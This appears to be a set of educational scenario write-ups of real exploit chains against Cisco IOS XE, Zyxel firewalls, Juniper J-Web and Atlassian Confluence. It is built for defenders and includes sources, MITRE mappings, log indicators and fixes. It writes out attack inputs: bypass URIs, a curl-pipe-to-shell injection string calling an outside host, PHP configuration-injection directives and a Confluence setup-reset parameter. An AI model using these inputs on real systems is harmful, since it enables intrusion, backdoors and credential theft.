### CVE-2023-20198: Cisco Talos, VulnCheck & CISA — Cisco IOS XE Web UI Zero-Day Chain & "BadCandy" Lua Implant
- **Scenario ID**: `cisco-ios-xe-cve-2023-20198-badimplant`
- **Canonical URL**: https://attackexplorer.org/scenarios/cisco-ios-xe-cve-2023-20198-badimplant
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=cisco-ios-xe-cve-2023-20198-badimplant
- **Category**: NETWORK_WEB | **Severity**: CRITICAL
- **Subtitle**: Cisco Talos · VulnCheck · CISA · CVE-2023-20198 + CVE-2023-20273 NGINX /%2577ebui_wsma_http & BadCandy
- **Overview**: Imagine a building where the front-door guard (NGINX Reverse Proxy) has strict orders: "Block any stranger who asks to visit room /webui_wsma_http!" However, the attacker writes the room name on their visitor slip using a double-layered cipher (/%2577ebui_wsma_http, where %2577 is %77 encoded twice). The front-door guard decodes the first layer (/%77ebui_wsma_http), says "Well, that doesn’t spell /webui_wsma_http!", and waves the slip through to the back-office clerk (WSMA Backend). The back-office clerk decodes the second layer (%77 -> w), sees /webui_wsma_http, and dutifully creates a master privilege 15 administrator account (CVE-2023-20198)! Next, using that new account, the attacker exploits a second bug (CVE-2023-20273) to break out into the router’s underlying Linux room, plants the BadCandy Lua spy script inside NGINX’s memory, and erases the temporary admin account so the router’s configuration looks 100% clean! Discovered and analyzed by Cisco Talos, VulnCheck, and CISA (October 2023), this two-zero-day chain compromised over 40,000 internet-facing Cisco IOS XE routers and switches with the Web UI enabled. First, requesting /%2577ebui_wsma_http (CVE-2023-20198, CVSS 10.0) bypasses NGINX authentication checks to reach the internal WSMA SOAP handler and create a local privilege 15 administrator account. Second, authenticating with that account to /webui/rest/softwareMgmt/installAdd (CVE-2023-20273) injects commands as Linux root to implant the BadCandy Lua webshell (/usr/binos/conf/nginx-conf/occo.conf -> oregon_http.lua) inside NGINX.
- **MITRE ATT&CK Techniques**: T1190 (Exploit Public-Facing Application (Cisco IOS XE Web UI CVE-2023-20198) - Initial Access), T1136.001 (Create Account: Local Account (Privilege 15 WSMA User) - Persistence), T1505.003 (Server Software Component: Web Shell (BadCandy NGINX Lua Implant CVE-2023-20273) - Persistence / Defense Evasion)
- **Primary Analytical Sources**: Cisco Talos Intelligence Group: Active Exploitation of Cisco IOS XE Software Web Management User Interface (CVE-2023-20198 & CVE-2023-20273) (https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/) | VulnCheck Initial Access Intelligence: Cisco IOS XE CVE-2023-20198 Deep Dive: NGINX /%2577ebui_wsma_http Double URL-Encoding Bypass (https://vulncheck.com/blog/cisco-ios-xe) | CISA & Cisco PSIRT: CISA Releases Guidance on Cisco IOS XE Web UI Zero-Day Exploitation (https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **DOUBLE URL-ENCODING BYPASS ON /%2577EBUI_WSMA_HTTP (CVE-2023-20198)** — Doubly encoding the letter w as %2577 tricks the outer NGINX proxy into letting the request past its /webui_wsma_http block rule, while the inner WSMA server decodes %77 back to w and runs the attacker’s SOAP CLI command. On Cisco IOS XE switches and routers with the HTTP/HTTPS Web UI enabled (ip http server / ip http secure-server), an NGINX reverse proxy sits in front of the internal Web Services Management Agent (WSMA). NGINX is configured to require authentication for the path /webui_wsma_http. However, by doubly URL-encoding the letter "w" as %2577, requesting POST /%2577ebui_wsma_http, NGINX decodes the URI once to /%77ebui_wsma_http (which does not match the string "/webui_wsma_http", so NGINX skips the authentication check) and proxies the request to the backend WSMA service, which decodes %77 a second time back to "w" and executes the XML SOAP payload (username cisco_support privilege 15 secret ..., CVE-2023-20198). Whenever WSMA executes a CLI configuration command over HTTP, Cisco IOS XE writes a telltale syslog entry: %SYS-5-CONFIG_I: Configured from http by console. In the documented HTTP POST / Syslog CONFIG_I exchange from IOS XE Zero-Day Operator to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with RESP HTTP 200 SOAP (confirming that the DOUBLE-ENCODE WSMA BYPASS request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 INSTALLADD COMMAND INJECTION TO LINUX ROOT (CVE-2023-20273)). On the diagram, follow Step #1 / Link #1 (#1→ DOUBLE-ENCODE WSMA BYPASS / ⇠#1 RESP HTTP 200 SOAP) from Node ① (#1 IOS XE Zero-Day Operator) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Cisco Talos / SIEM Sensor). [Specs: VULNERABILITY=CVE-2023-20198 (CVSS 10.0 Unauthenticated Privilege 15 Bypass); BYPASS URI=POST /%2577ebui_wsma_http or /%2577ebui_wsma_https; CREATED ACCOUNT=username cisco_support privilege 15 secret <pass>]
  - Stage 2 (T1068 · Exploitation for Privilege Escalation): **INSTALLADD COMMAND INJECTION TO LINUX ROOT (CVE-2023-20273)** — Having privilege 15 lets you configure router ports in IOS CLI, but doesn’t give you direct access to the underlying Linux filesystem. So the attacker uses their new cisco_support login to trigger a command injection bug in installAdd (CVE-2023-20273) and become Linux root! Cisco IOS XE runs as a daemon (IOSd) on top of an underlying Linux operating system (BinOS). While CVE-2023-20198 gives the attacker an IOS CLI "privilege 15" administrator account, planting a stealthy web backdoor requires Linux root access. Authenticating with the newly created cisco_support account, the attacker sends a crafted JSON POST request to /webui/rest/softwareMgmt/installAdd (CVE-2023-20273, an authenticated OS command injection flaw in the Web UI software installation handler that passes unsanitized parameters to a Linux root shell). When CVE-2023-20273 triggers, the router logs %WEBUI-6-INSTALL_OPERATION_INFO: User: username, Install Operation: ADD right as the attacker’s Linux root commands execute. In the documented IOS XE WebUI / CVE-2023-20273 exchange from DMZ Reverse Proxy & SPAN Tap to Cisco Catalyst / ISR (IOS XE), Cisco Catalyst / ISR (IOS XE) responds with ACK UID 0 (root) (confirming that the INSTALLADD ROOT RCE request succeeded on Cisco Catalyst / ISR (IOS XE) and establishing the runtime state required for Step #3 IMPLANTING THE "BADCANDY" LUA WEBSHELL IN NGINX). On the diagram, follow Step #2 / Link #2 (#2→ INSTALLADD ROOT RCE / ⇠#2 ACK UID 0 (root)) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 Cisco Catalyst / ISR (IOS XE)), monitored by Node ⑥ (#6 Cisco Talos / SIEM Sensor). [Specs: VULNERABILITY=CVE-2023-20273 (Web UI installAdd Root Command Injection); REST ENDPOINT=POST /webui/rest/softwareMgmt/installAdd; GAINED CONTEXT=Underlying Linux BinOS root shell (UID 0)]
  - Stage 3 (T1505.003 · Server Software Component: Web Shell (BadCandy Lua)): **IMPLANTING THE "BADCANDY" LUA WEBSHELL IN NGINX** — As Linux root, the attacker writes occo.conf and oregon_http.lua (BadCandy), reloads NGINX so the Lua backdoor lives in RAM, and then deletes the cisco_support user from running-config so admins inspecting the router config see nothing wrong! With Linux root privileges, the attacker writes the BadCandy Lua webshell to /var/scrollable/view/oregon_http.lua, adds an NGINX configuration hook at /usr/binos/conf/nginx-conf/occo.conf (which maps the URL /webui/logoutconfirm.html?logon_hash=1 to execute oregon_http.lua), and sends a SIGHUP signal to nginx so it reloads the Lua script into memory. As VulnCheck documented, the attacker then deletes the temporary cisco_support account from the IOS running-config (so an administrator running show running-config sees no unauthorized users, while the BadCandy Lua backdoor remains active inside NGINX’s memory and allows full root + IOS CLI execution at any time). Because BadCandy resides in volatile filesystem paths (/usr/binos/conf/nginx-conf/occo.conf) that are wiped on a full device reload, rebooting the router clears the implant, provided the admin also disables the Web UI or installs Cisco’s patch so the attacker cannot immediately re-exploit it. On the diagram, follow Step #3 / Link #3 (#3→ BADCANDY LUA IMPLANT / ⇠#3 RESP 18-Char Hex ID) from Node ③ (#3 Cisco Catalyst / ISR (IOS XE)) to Node ④ (#4 WSMA Priv-15 & installAdd RCE), monitored by Node ⑥ (#6 Cisco Talos / SIEM Sensor). [Specs: IMPLANT NAME=BadCandy (Cisco Talos) — NGINX Lua Webshell; CONFIG & SCRIPT=/usr/binos/conf/nginx-conf/occo.conf & oregon_http.lua; EVASION TRICK=Deletes rogue privilege 15 user after NGINX loads Lua into RAM]

### CVE-2023-28771: TRAPA Security, Rapid7 & CISA — Zyxel Firewall Pre-Auth IKEv2 Packet Decoder Command Injection
- **Scenario ID**: `zyxel-firewall-cve-2023-28771-ike-rce`
- **Canonical URL**: https://attackexplorer.org/scenarios/zyxel-firewall-cve-2023-28771-ike-rce
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=zyxel-firewall-cve-2023-28771-ike-rce
- **Category**: NETWORK_WEB | **Severity**: CRITICAL
- **Subtitle**: TRAPA Security · Rapid7 · CISA KEV · UDP/500 IKEv2 Notify Payload DES Decrypt & system() RCE
- **Overview**: Imagine a castle gatekeeper (Zyxel ssod IKEv2 VPN Daemon on UDP port 500) who receives an error note (Notify Payload Type 14) from a stranger outside the moat. The first 48 letters of the note are locked with a secret cipher (3DES-CBC), but the gatekeeper’s cipher key is printed right inside the public instruction manual! Even worse, once the gatekeeper unlocks those first 48 letters, they don’t even check if the rest of the note was locked, and to record the error in their diary (/tmp/sdwan_vpndebug.log), they shout to a root servant (system()): echo "<Stranger’s Note>" >> /tmp/sdwan_vpndebug.log! By writing "; curl http://.../z.sh | sh ; echo " at the end of the UDP packet, the stranger takes over the entire firewall with a single UDP packet! Discovered by TRAPA Security and analyzed by Rapid7 and CISA KEV (April–May 2023), CVE-2023-28771 (CVSS 9.8) is an unauthenticated remote OS command injection flaw in the IKEv2 VPN daemon (/usr/sbin/ssod) of Zyxel ATP, USG FLEX, VPN, and ZyWALL firewalls. When an attacker sends a single UDP packet to port 500 containing an IKE_SA_INIT Notify payload (type 14), libike.so decrypts the first 48 bytes using a hardcoded 3DES key and passes the unescaped payload string directly into system("echo ... >> /tmp/sdwan_vpndebug.log") as root.
- **MITRE ATT&CK Techniques**: T1190 (Exploit Public-Facing Application (Zyxel UDP/500 IKEv2 CVE-2023-28771) - Initial Access), T1059.004 (Command and Scripting Interpreter: Unix Shell (sshipsecpm system() RCE) - Execution)
- **Primary Analytical Sources**: TRAPA Security Research: Root Cause Analysis of Zyxel Firewall Unauthenticated Remote Command Execution (CVE-2023-28771) (https://trapa.security/blog/cve-2023-28771/) | Rapid7 Emergent Threat Response: Zyxel Firewall Pre-Auth Command Injection (CVE-2023-28771) Exploit & Network Signatures (https://attackerkb.com/topics/N3i8dxpFKS/cve-2023-28771/rapid7-analysis) | Zyxel PSIRT & CISA KEV: Zyxel Security Advisory for OS Command Injection Vulnerability in Firewalls (CVE-2023-28771) (https://www.zyxel.com/global/en/support/security-advisories/zyxel-security-advisory-for-remote-command-injection-vulnerability-of-firewalls)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **CRAFTING AN IKEV2 NOTIFY PAYLOAD WITH ZYXEL’S HARDCODED 3DES KEY (CVE-2023-28771)** — To reach the vulnerable logging function in libike.so, the attacker sends a UDP/500 IKE_SA_INIT packet with a Notify payload (Type 14) whose first 48 bytes are encrypted with the static 3DES key extracted from Zyxel’s firmware. As reverse-engineered by TRAPA Security and Rapid7, Zyxel’s VPN key-exchange daemon (/usr/sbin/ssod linked with /lib/libike.so) listens on UDP port 500. When an unauthenticated internet client sends an IKEv2 IKE_SA_INIT packet (Exchange Type 34) containing a Notify payload with Message Type 14 (NO_PROPOSAL_CHOSEN), the function ikev2_fb_Extract_N_Payload() decrypts the first 48 bytes of the notification data using 3DES-CBC with a hardcoded 24-byte key and 8-byte IV baked directly into the firmware binary (meaning any attacker who extracts that key from a public firmware download can craft a valid 48-byte header). Even more remarkably, libike.so only decrypts the first 48 bytes of the Notify payload and leaves all bytes after offset 48 completely unencrypted in plaintext!. In the documented UDP/500 IKEv2 Notify exchange from Remote UDP/500 Exploiter to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with RESP UDP 188 Bytes (confirming that the IKEV2 NOTIFY INJECT request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 BREAKING OUT OF SYSTEM("ECHO ... >> /TMP/SDWAN_VPNDEBUG.LOG")). On the diagram, follow Step #1 / Link #1 (#1→ IKEV2 NOTIFY INJECT / ⇠#1 RESP UDP 188 Bytes) from Node ① (#1 Remote UDP/500 Exploiter) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 WAN NDR & Syslog SIEM). [Specs: VULNERABILITY=CVE-2023-28771 (CVSS 9.8 Pre-Auth UDP/500 IKEv2 RCE); PROTOCOL & PORT=UDP Port 500 (IKEv2 IKE_SA_INIT Notify Type 14); CRYPTO FLAW=Hardcoded 24-Byte 3DES-CBC Key in libike.so]
  - Stage 2 (T1059.004 · Command and Scripting Interpreter: Unix Shell): **BREAKING OUT OF SYSTEM("ECHO ... >> /TMP/SDWAN_VPNDEBUG.LOG")** — Instead of using C’s fopen() and fwrite() to write a debug log line, the developer called system("echo <packet_data> >> /tmp/sdwan_vpndebug.log") as root! To record the SD-WAN VPN debug message, ssod passes the extracted notification string into cmd_string_unescape() and then formats a shell command using snprintf: "echo %s >> /tmp/sdwan_vpndebug.log" (passing that string straight into C’s system() function running as uid=0 root, CVE-2023-28771). By placing "; curl http://198.51.100.233/z.sh | sh ; echo " right after the 48-byte 3DES block in the UDP packet, the attacker closes the echo quote, executes their arbitrary shell command as root, and re-opens the quote cleanly. Why is calling system("echo ...") to write a log file a textbook C anti-pattern? Because invoking /bin/sh -c on network-supplied strings allows shell metacharacters (; |, $()) to execute arbitrary operating-system commands. In the documented ssod system() Exec exchange from DMZ Reverse Proxy & SPAN Tap to Zyxel USG FLEX / ATP Firewall, Zyxel USG FLEX / ATP Firewall responds with ACK UID 0 (root) (confirming that the SDWAN DEBUG LOG RCE request succeeded on Zyxel USG FLEX / ATP Firewall and establishing the runtime state required for Step #3 PERIMETER FIREWALL TAKEOVER & INTERNAL LAN PIVOTING). On the diagram, follow Step #2 / Link #2 (#2→ SDWAN DEBUG LOG RCE / ⇠#2 ACK UID 0 (root)) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 Zyxel USG FLEX / ATP Firewall), monitored by Node ⑥ (#6 WAN NDR & Syslog SIEM). [Specs: VULNERABLE SINK=system("echo <notify_str> >> /tmp/sdwan_vpndebug.log"); INJECTION STRING="; curl http://198.51.100.233/z.sh | sh ; echo "; PRIVILEGE LEVEL=uid=0(root) gid=0(root) via /usr/sbin/ssod]
  - Stage 3 (T1583.005 · Acquire Infrastructure: Botnet / Perimeter Gateway Takeover): **PERIMETER FIREWALL TAKEOVER & INTERNAL LAN PIVOTING** — Because UDP is connectionless, a single 188-byte UDP packet to port 500 is enough to force the firewall to download and run a root backdoor from the internet. Because CVE-2023-28771 triggers on the very first UDP/500 packet of an IKEv2 exchange (requiring zero authentication or multi-step handshake before reaching the vulnerable logging function), the attacker’s single packet forces the Zyxel firewall to reach out via curl/wget, download a stage-2 ELF binary into /tmp/, and execute it with full root privileges over the perimeter gateway. Because UDP source IP addresses can be spoofed when no handshake is required, attackers could even trigger blind command execution across wide IP ranges in seconds. In the documented HTTP GET Stage-2 ELF exchange from Zyxel USG FLEX / ATP Firewall to ssod 3DES Decrypt & system() Sink, ssod 3DES Decrypt & system() Sink responds with RESP Root Implant (confirming that the FIREWALL STAGE-2 FETCH request succeeded on ssod 3DES Decrypt & system() Sink and completing the final execution objective of TRAPA Security, Rapid7 & CISA, Zyxel Firewall Pre-Auth IKEv2 Packet Decoder Command Injection). On the diagram, follow Step #3 / Link #3 (#3→ FIREWALL STAGE-2 FETCH / ⇠#3 RESP Root Implant) from Node ③ (#3 Zyxel USG FLEX / ATP Firewall) to Node ④ (#4 ssod 3DES Decrypt & system() Sink), monitored by Node ⑥ (#6 WAN NDR & Syslog SIEM). [Specs: FORENSIC LOG FILE=/tmp/sdwan_vpndebug.log (Contains injected shell commands); ATTACK COMPLEXITY=Single connectionless UDP/500 packet (Zero auth); REMEDIATION=Upgrade ZLD Firmware to V5.36 Patch 1+ / V4.73 Patch 1+]

### CVE-2023-36845: watchTowr, VulnCheck & CISA — Juniper Junos OS J-Web: PHPRC "/dev/fd/0" Fileless Pre-Auth RCE
- **Scenario ID**: `juniper-junos-jweb-cve-2023-36845-chain`
- **Canonical URL**: https://attackexplorer.org/scenarios/juniper-junos-jweb-cve-2023-36845-chain
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=juniper-junos-jweb-cve-2023-36845-chain
- **Category**: NETWORK_WEB | **Severity**: CRITICAL
- **Subtitle**: watchTowr Labs · VulnCheck · Juniper SIRT · CVE-2023-36845 PHPRC=/dev/fd/0 & auto_prepend_file RCE
- **Overview**: Imagine a chef (FreeBSD php-cgi) who starts work every morning by reading a rulebook (php.ini) from a shelf whose location is written on a sticky note (PHPRC environment variable). In Juniper’s J-Web kitchen (Appweb), any visitor walking up to /webauth_operation.php is accidentally allowed to rewrite that sticky note (?PHPRC=..., CVE-2023-36845)! At first, researchers thought you had to smuggle a fake rulebook onto a shelf inside the kitchen first (CVE-2023-36846). Then VulnCheck realized something brilliant: what if you write PHPRC=/dev/fd/0 on the sticky note, telling the chef that the rulebook is the visitor’s own order slip (Standard Input / HTTP POST Body)? The chef reads the visitor’s POST body as php.ini, sees the rule auto_prepend_file="data://text/plain;base64...", and runs the visitor’s PHP code in memory without touching a single file on disk! Synthesizing watchTowr Labs’ initial J-Web exploit chain, VulnCheck’s single-request fileless refinement, and Juniper SIRT Advisory JSA72300 / CISA KEV (August 2023), CVE-2023-36845 allows an unauthenticated attacker to manipulate the PHPRC environment variable on Juniper SRX firewalls and EX switches. By sending POST /webauth_operation.php?PHPRC=/dev/fd/0 with an HTTP request body containing allow_url_include=1 and auto_prepend_file="data://text/plain;base64...", the FreeBSD php-cgi process parses the HTTP POST body (stdin / /dev/fd/0) as php.ini and executes arbitrary PHP and shell commands completely filelessly.
- **MITRE ATT&CK Techniques**: T1190 (Exploit Public-Facing Application (Juniper J-Web PHPRC CVE-2023-36845) - Initial Access), T1059.004 (Command and Scripting Interpreter: Fileless PHP auto_prepend_file Execution - Execution / Defense Evasion)
- **Primary Analytical Sources**: watchTowr Labs: CVEs-2023-36844 to 36847: Juniper SRX & EX Pre-Auth Remote Code Execution Chain (https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) | VulnCheck Initial Access Intelligence: Single-Request Fileless RCE on Juniper J-Web via PHPRC=/dev/fd/0 (CVE-2023-36845) (https://vulncheck.com/blog/juniper-cve-2023-36845) | Juniper SIRT & CISA KEV: 2023-08 Out-of-Cycle Security Bulletin: Junos OS SRX and EX Series J-Web Vulnerabilities (JSA72300) (https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **MANIPULATING THE "PHPRC" ENVIRONMENT VARIABLE VIA J-WEB (CVE-2023-36845)** — Because Juniper’s Appweb server turns URL query parameters into OS environment variables before launching php-cgi, adding ?PHPRC=/dev/fd/0 points PHP’s configuration reader directly at the incoming HTTP POST body (stdin). On Juniper SRX firewalls and EX switches running J-Web, the Appweb HTTP server spawns /usr/local/bin/php-cgi to process PHP pages like /webauth_operation.php (which is reachable without logging in). Due to CVE-2023-36845, Appweb populates the child process’s environment variables from the HTTP request’s parameters. By sending POST /webauth_operation.php?PHPRC=/dev/fd/0, the attacker sets the PHPRC environment variable (which tells PHP where to load its php.ini configuration file on startup) to /dev/fd/0 (file descriptor 0 on FreeBSD, Standard Input, which in CGI mode contains the raw body of the attacker’s HTTP POST request!). Compare the two multi-source approaches: watchTowr Labs first demonstrated a 2-step chain (uploading a file via CVE-2023-36846 and pointing PHPRC to that uploaded file), whereas VulnCheck showed that pointing PHPRC to /dev/fd/0 eliminates the file upload entirely and works in a single fileless HTTP POST request. On the diagram, follow Step #1 / Link #1 (#1→ PHPRC=/DEV/FD/0 POST / ⇠#1 RESP HTTP 200 OK) from Node ① (#1 Remote Exploit Operator) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Junos Syslog & NDR SIEM). [Specs: VULNERABILITY=CVE-2023-36845 (J-Web PHP Environment Variable Manipulation); TARGET ENDPOINT=POST /webauth_operation.php?PHPRC=/dev/fd/0; FREEBSD STDIN FD=/dev/fd/0 (Maps directly to the HTTP POST body in CGI)]
  - Stage 2 (T1574.007 · Hijack Execution Flow: Path Interception by Environment Variable): **INJECTING AUTO_PREPEND_FILE="DATA://..." IN THE HTTP POST BODY** — When php-cgi opens /dev/fd/0 thinking it is php.ini, it reads the attacker’s POST body: allow_url_include=1 and auto_prepend_file="data://text/plain;base64...". As php-cgi initializes before executing webauth_operation.php, it opens /dev/fd/0 and parses the attacker’s HTTP POST body as php.ini directives. Inside that body, the attacker writes allow_url_include=1 (unlocking PHP’s ability to execute code directly from inline data:// URLs) and auto_prepend_file="data://text/plain;base64,PD9waHAg..." (instructing PHP to automatically decode and run that base64 PHP script in memory before running the requested page). Because both the fake php.ini (/dev/fd/0) and the prepended PHP script (data://text/plain;base64...) exist strictly in memory streams, zero files are ever created in /var/tmp/ on the firewall. On the diagram, follow Step #2 / Link #2 (#2→ STDIN PHP.INI PARSE / ⇠#2 ACK Fileless INI) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 Juniper SRX / EX (J-Web)), monitored by Node ⑥ (#6 Junos Syslog & NDR SIEM). [Specs: INI DIRECTIVE 1=allow_url_include = 1 (Enables data:// stream execution); INI DIRECTIVE 2=auto_prepend_file = "data://text/plain;base64,..."; DISK FOOTPRINT=Zero files written to disk (100% fileless in memory)]
  - Stage 3 (T1059.004 · Command and Scripting Interpreter: Unix Shell): **FILELESS IN-MEMORY PHP EXECUTION & JUNOS CONFIG EXTRACTION** — The prepended PHP payload runs system() to grab the firewall’s master configuration (/config/juniper.conf.gz) and calls die() so the stolen data is sent right back in the HTTP 200 response. When php-cgi executes the prepended data:// stream, the attacker’s PHP code invokes system or passthru to run FreeBSD shell commands on the Junos device (such as extracting /config/juniper.conf.gz, which contains all firewall rules, VPN pre-shared keys, and $9$ or SHA-512 administrator password hashes, and terminating the PHP script so the command output is returned cleanly in the HTTP response). In Junos OS, passwords encrypted with the reversible $9$ format inside juniper.conf can be instantly decrypted offline using known Junos $9$ decoding scripts. In the documented FreeBSD Process Exec exchange from Juniper SRX / EX (J-Web) to php-cgi PHPRC=/dev/fd/0 Loader, php-cgi PHPRC=/dev/fd/0 Loader responds with ACK 1,842 Bytes (confirming that the JUNOS CONFIG EXFIL request succeeded on php-cgi PHPRC=/dev/fd/0 Loader and completing the final execution objective of watchTowr, VulnCheck & CISA, Juniper Junos OS J-Web: PHPRC "/dev/fd/0" Fileless Pre-Auth RCE). On the diagram, follow Step #3 / Link #3 (#3→ JUNOS CONFIG EXFIL / ⇠#3 ACK 1,842 Bytes) from Node ③ (#3 Juniper SRX / EX (J-Web)) to Node ④ (#4 php-cgi PHPRC=/dev/fd/0 Loader), monitored by Node ⑥ (#6 Junos Syslog & NDR SIEM). [Specs: EXECUTION CONTEXT=php-cgi -> /bin/sh on FreeBSD Junos OS; TARGET CONFIG=/config/juniper.conf.gz (Firewall rules, VPN keys & hashes); MITIGATION=Patch Junos OS (JSA72300) or disable J-Web on WAN interfaces]

### CVE-2023-22515: Microsoft, Rapid7 & CISA — Storm-0062: Atlassian Confluence XWork OGNL Setup Reset & OSGi Webshell
- **Scenario ID**: `atlassian-confluence-cve-2023-22515-storm0062`
- **Canonical URL**: https://attackexplorer.org/scenarios/atlassian-confluence-cve-2023-22515-storm0062
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=atlassian-confluence-cve-2023-22515-storm0062
- **Category**: NETWORK_WEB | **Severity**: CRITICAL
- **Subtitle**: CISA AA23-289A · Rapid7 · Storm-0062 · /server-info.action setupComplete=false & Admin Creation
- **Overview**: Imagine a commercial bank vault (Atlassian Confluence) that has a special "First-Day Factory Setup Mode" (setupComplete=false) used only on the day the vault is installed so the builder can register the first master manager. Once installation finishes, a latch flips to setupComplete=true and locks the setup screen forever. However, the public lobby clock (/server-info.action) is wired to the bank’s internal control board through Apache XWork parameter chains. By adding ?bootstrapStatusProvider.applicationConfig.setupComplete=false to a lobby clock query, Storm-0062 reaches through the wiring, flips the factory latch back to false, walks into the newly unlocked setup room (/setup/setupadministrator.action) to print a master admin badge, and flips the latch back to true so nobody notices! Synthesizing Microsoft Threat Intelligence (Storm-0062 / DarkShadow), Rapid7, Atlassian, and Joint CISA/FBI Advisory AA23-289A (October 2023), CVE-2023-22515 (CVSS 10.0) is a zero-day Broken Access Control / XWork parameter injection vulnerability in Atlassian Confluence Data Center and Server (8.0.0–8.5.1). An unauthenticated attacker sends an HTTP request to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false to reset the server’s installation state in memory, submits /setup/setupadministrator.action with X-Atlassian-Token: no-check to create a rogue confluence-administrators account, calls /setup/finishsetup.action to restore normal UI behavior, and uploads a malicious OSGi servlet plugin (.jar) via /rest/plugins/1.0/ for full OS command execution.
- **MITRE ATT&CK Techniques**: T1190 (Exploit Public-Facing Application (Confluence XWork CVE-2023-22515) - Initial Access), T1136.001 (Create Account: Local Account (confluence-administrators) - Persistence), T1505.003 (Server Software Component: Web Shell (OSGi Servlet Plugin) - Persistence / Execution)
- **Primary Analytical Sources**: CISA, FBI & MS-ISAC Joint Advisory: AA23-289A: Threat Actors Exploit Atlassian Confluence CVE-2023-22515 for Initial Access (https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-289a) | Rapid7 Emergent Threat Response: Atlassian Confluence Zero-Day Broken Access Control (CVE-2023-22515) Technical Analysis (https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis) | Atlassian Security & Microsoft Threat Intelligence: Confluence Data Center and Server Broken Access Control Vulnerability (CVE-2023-22515) (https://confluence.atlassian.com/security/cve-2023-22515-broken-access-control-vulnerability-in-confluence-data-center-and-server-1295682276.html)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application (CVE-2023-22515)): **XWork Parameter Injection (/server-info.action setupComplete=false)** — By passing a chained property path in the URL of the public /server-info.action page, the attacker tricks Apache XWork into walking up the Java object tree and flipping the master setupComplete switch back to false. Storm-0062 sends an unauthenticated GET request to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false (an HTTP query string that abuses Apache Struts / XWork OGNL parameter binding to walk through ServerInfoAction.getBootstrapStatusProvider().getApplicationConfig() and invoke setSetupComplete(false) on the global Confluence configuration singleton). Flipping setupComplete to false tricks the running Confluence Data Center server into believing its initial installation wizard has not yet finished (which immediately unlocks the unauthenticated /setup/* administrative provisioning endpoints that are normally blocked after day-one deployment). Because ServerInfoAction inherits from ConfluenceActionSupport, which exposes a public getBootstrapStatusProvider() getter returning the global BootstrapStatusProvider bean, XWork’s ParametersInterceptor automatically resolves nested dot-notation properties and calls setSetupComplete(false) in JVM memory. In the documented HTTP GET / Tomcat Log exchange from Storm-0062 (DarkShadow) C2 to DMZ Reverse Proxy & SPAN Tap, DMZ Reverse Proxy & SPAN Tap responds with RESP HTTP 200 (412 B) (confirming that the XWORK SETUP RESET request succeeded on DMZ Reverse Proxy & SPAN Tap and establishing the runtime state required for Step #2 Rogue Admin Provisioning (/setup/setupadministrator.action)). On the diagram, follow Step #1 / Link #1 (#1→ XWORK SETUP RESET / ⇠#1 RESP HTTP 200 (412 B)) from Node ① (#1 Storm-0062 (DarkShadow) C2) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Defender & Access Log SIEM).   - Stage 2 (T1136.001 · Create Account: Local Account (confluence-administrators)): **Rogue Admin Provisioning (/setup/setupadministrator.action)** — With the factory setup room unlocked, the attacker submits the new-admin registration form with a special X-Atlassian-Token: no-check stamp, then immediately clicks "Finish Setup" (/setup/finishsetup.action) so regular employees don’t see a broken setup screen. With the setup wizard unlocked, the attacker sends a POST request to /setup/setupadministrator.action with the header X-Atlassian-Token: no-check (an Atlassian header that bypasses Cross-Site Request Forgery token validation on administrative form submissions) to register a brand-new account in the confluence-administrators group. Immediately afterward, the attacker sends POST /setup/finishsetup.action (which flips setupComplete back to true in confluence.cfg.xml so that regular users continue using the wiki normally without seeing a broken setup screen). Calling /setup/finishsetup.action is a critical operational security step for the attacker: if setupComplete were left as false, every employee visiting the company wiki would be redirected to the installation screen and immediately alert IT. In the documented HTTP POST / Security Log exchange from DMZ Reverse Proxy & SPAN Tap to Confluence Server (Tomcat :8090), Confluence Server (Tomcat :8090) responds with RESP HTTP 302 -> /setup/finishsetup.action (confirming that the ROGUE ADMIN CREATED request succeeded on Confluence Server (Tomcat :8090) and establishing the runtime state required for Step #3 Malicious OSGi Plugin Upload & JVM Shell Execution).   - Stage 3 (T1505.003 · Server Software Component: Web Shell (OSGi Plugin)): **Malicious OSGi Plugin Upload & JVM Shell Execution** — Logged in with their brand-new master admin badge, the attacker uses Confluence’s official plugin installer (/rest/plugins/1.0/) to load a custom .jar add-on that runs shell commands inside the Confluence server. Invoking the plugin endpoint spawns /bin/sh or cmd.exe directly beneath the Confluence java process (granting interactive remote code execution and access to all enterprise wiki pages, credentials, and database keys). ### CVE-2023-46604: Rapid7, Huntress & Trend Micro — Apache ActiveMQ OpenWire ExceptionResponse Deserialization RCE
- **Scenario ID**: `apache-activemq-cve-2023-46604-openwire`
